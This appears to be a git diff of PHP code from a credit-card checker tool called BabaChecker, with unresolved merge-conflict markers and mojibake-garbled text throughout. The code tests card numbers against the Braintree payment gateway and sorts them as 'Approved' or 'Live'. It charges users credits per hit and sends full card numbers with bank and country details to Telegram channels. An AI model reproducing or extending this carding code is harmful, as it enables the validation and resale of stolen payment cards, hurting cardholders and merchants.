@@ -1,4 +1,8 @@
+<<<<<<< HEAD
 ﻿<?php
+=======
+<?php
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
 require_once __DIR__ . '/../../app/Db.php';
@@ -250,7 +254,11 @@ $dead_responses = [
     "We cannot process your oder" => "We cannot process your order",
     "ProxyError" => "Proxy Connection Refused"
 ];
+<<<<<<< HEAD
 $liveResponses = ['Live âœ…', 'Insufficient Funds', 'Card Issuer Declined CVV'];
+=======
+$liveResponses = ['Live ✅', 'Insufficient Funds', 'Card Issuer Declined CVV'];
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
 // Check for Approved response first
 if (
     (stripos($response, 'Payment method successfully added.') !== false) ||
@@ -263,6 +271,7 @@ if (
     $new_credits = updateCredits($pdo, $uid, 3, true, false); // 1 credit for Approved
     $fullResult =
         "<b>#BraintreeAuth</b>\n" .
+<<<<<<< HEAD
         "â”â”â”â”â”â”â”â”â”â”â”\n" .
         "[ï¾’] <b>Card âžœ</b> <code>{$cc1}</code>\n" .
         "[ï¾’] <b>Status âžœ</b> Approved âœ…\n" .
@@ -275,11 +284,26 @@ if (
         "â”â”â”â”â”â”â”â”â”â”â”\n" .
         "[ï¾’] <b>Checked By âžœ</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
         "[ã‡º] <b>Dev âžœ</b> BabaChecker";
+=======
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
+        "[ﾒ] <b>Status ➜</b> Approved ✅\n" .
+        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
+        "[ﾒ] <b>Gateway ➜</b> Braintree Auth\n" .
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
+        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[ㇺ] <b>Dev ➜</b> BabaChecker";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage =
+<<<<<<< HEAD
         "<b>Hit Detected âœ…</b>\n" .
         "â”â”â”â”â”â”â”â”\n" .
         "<b>User âžœ</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
@@ -288,6 +312,16 @@ if (
         "<b>Gateway âžœ</b> Braintree Auth\n" .
         "â”â”â”â”â”â”â”â”\n" .
         "<b>Hit From âžœ</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
+=======
+        "<b>Hit Detected ✅</b>\n" .
+        "━━━━━━━━\n" .
+        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ➜</b> <b>Approved ✅</b>\n" .
+        "<b>Response ➜</b> {$err} 🎉\n" .
+        "<b>Gateway ➜</b> Braintree Auth\n" .
+        "━━━━━━━━\n" .
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'approved',
@@ -307,6 +341,7 @@ if (
     $new_credits = updateCredits($pdo, $uid, 1, true, false); // 1 credit for Live
     $fullResult =
         "<b>#BraintreeAuth</b>\n" .
+<<<<<<< HEAD
         "â”â”â”â”â”â”â”â”â”â”â”\n" .
         "[ï¾’] <b>Card âžœ</b> <code>{$cc1}</code>\n" .
         "[ï¾’] <b>Status âžœ</b> Live âœ…\n" .
@@ -319,11 +354,26 @@ if (
         "â”â”â”â”â”â”â”â”â”â”â”\n" .
         "[ï¾’] <b>Checked By âžœ</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
         "[ã‡º] <b>Dev âžœ</b> BabaChecker";
+=======
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
+        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
+        "[ﾒ] <b>Response ➜</b> {$err}\n" .
+        "[ﾒ] <b>Gateway ➜</b> Braintree Auth\n" .
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
+        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[ㇺ] <b>Dev ➜</b> BabaChecker";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage =
+<<<<<<< HEAD
         "<b>Hit Detected âœ…</b>\n" .
         "â”â”â”â”â”â”â”â”\n" .
         "<b>User âžœ</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
@@ -332,6 +382,16 @@ if (
         "<b>Gateway âžœ</b> Braintree Auth\n" .
         "â”â”â”â”â”â”â”â”\n" .
         "<b>Hit From âžœ</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
+=======
+        "<b>Hit Detected ✅</b>\n" .
+        "━━━━━━━━\n" .
+        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ➜</b> <b>Live ✅</b>\n" .
+        "<b>Response ➜</b> {$err}\n" .
+        "<b>Gateway ➜</b> Braintree Auth\n" .
+        "━━━━━━━━\n" .
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'live',
@@ -351,6 +411,7 @@ if (
     $new_credits = updateCredits($pdo, $uid, 1, true, false); // 1 credit for Live
     $fullResult =
         "<b>#BraintreeAuth</b>\n" .
+<<<<<<< HEAD
         "â”â”â”â”â”â”â”â”â”â”â”\n" .
         "[ï¾’] <b>Card âžœ</b> <code>{$cc1}</code>\n" .
         "[ï¾’] <b>Status âžœ</b> Live âœ…\n" .
@@ -363,11 +424,26 @@ if (
         "â”â”â”â”â”â”â”â”â”â”â”\n" .
         "[ï¾’] <b>Checked By âžœ</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
         "[ã‡º] <b>Dev âžœ</b> BabaChecker";
+=======
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
+        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
+        "[ﾒ] <b>Response ➜</b> {$err}\n" .
+        "[ﾒ] <b>Gateway ➜</b> Braintree Auth\n" .
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
+        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
+        "━━━━━━━━━━━\n" .
+        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[ㇺ] <b>Dev ➜</b> BabaChecker";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage =
+<<<<<<< HEAD
         "<b>Hit Detected âœ…</b>\n" .
         "â”â”â”â”â”â”â”â”\n" .
         "<b>User âžœ</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
@@ -376,6 +452,16 @@ if (
         "<b>Gateway âžœ</b> Braintree Auth\n" .
         "â”â”â”â”â”â”â”â”\n" .
         "<b>Hit From âžœ</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
+=======
+        "<b>Hit Detected ✅</b>\n" .
+        "━━━━━━━━\n" .
+        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ➜</b> <b>Live ✅</b>\n" .
+        "<b>Response ➜</b> {$err}\n" .
+        "<b>Gateway ➜</b> Braintree Auth\n" .
+        "━━━━━━━━\n" .
+        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'live',
@@ -432,4 +518,8 @@ if (
         ]);
         exit;
     }
+<<<<<<< HEAD
 }
+=======
+}
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
